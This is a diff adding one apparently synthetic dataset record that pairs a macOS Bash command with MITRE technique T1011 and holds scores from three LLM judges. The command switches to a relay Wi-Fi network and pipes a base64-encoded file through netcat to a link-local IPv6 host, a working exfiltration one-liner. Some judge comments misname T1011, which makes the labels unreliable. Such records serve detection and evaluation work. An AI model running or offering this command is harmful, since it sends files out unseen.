@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo /System/Library/PrivateFrameworks/Apple80211.framework/Resources/airport -z && networksetup -setairportnetwork en0 \"ops-relay-153\" \"ops-153-=\" && openssl enc -base64 -A -in /Users/Shared/exports/metrics.json | nc -6 fe80::f00d:beef:dead:ba5e%en0 54831 -w 3",
+  "explanation": "Moves a JSON metrics file across an alternative Wi\u2011Fi SSID using IPv6 link-local addressing and a high, uncommon TCP port. Base64 encoding reduces casual visibility and the use of a separate medium satisfies T1011.",
+  "rationale_steps": [
+    "Clear any current Wi\u2011Fi association.",
+    "Join a relay SSID distinct from the primary network.",
+    "Base64-encode the file inline.",
+    "Send via IPv6 link-local constrained to the Wi\u2011Fi interface on a high port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-0b4a25ae-c2421240",
+  "source_prompt_hash": "0b4a25ae",
+  "timestamp_utc": "2025-09-30T08:33:07.947625Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators (&&), balanced quotes, valid flags for all tools (airport, networksetup, openssl, nc), and correct parameter syntax.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does exfiltrate data over a network connection, it doesn't actually modify system firmware/OS images as described in T1011 (Modify System Image), but instead appears to implement exfiltration over alternative protocol (T1048.003).",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T20:12:50.821600Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard macOS utilities, valid flags, correct operators, and proper quoting, making it perfectly well-formed and parseable.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs data exfiltration, which is fundamentally unrelated to the T1011 Modify System Image technique, and the stated 'Privilege: None' contradicts the `sudo` requirement for initial network changes.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T20:13:11.831554Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quotes, correct use of && and a pipeline, valid flags, and acceptable IPv6 link-local scope syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly disconnects, joins a specific Wi\u2011Fi SSID, and base64-encodes then transmits the file via nc over IPv6 (aligned with exfiltration over an alternate network), but relies on en0, the private airport path, and requires sudo despite the stated 'Privilege: None'.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2025-10-02T20:14:15.578806Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
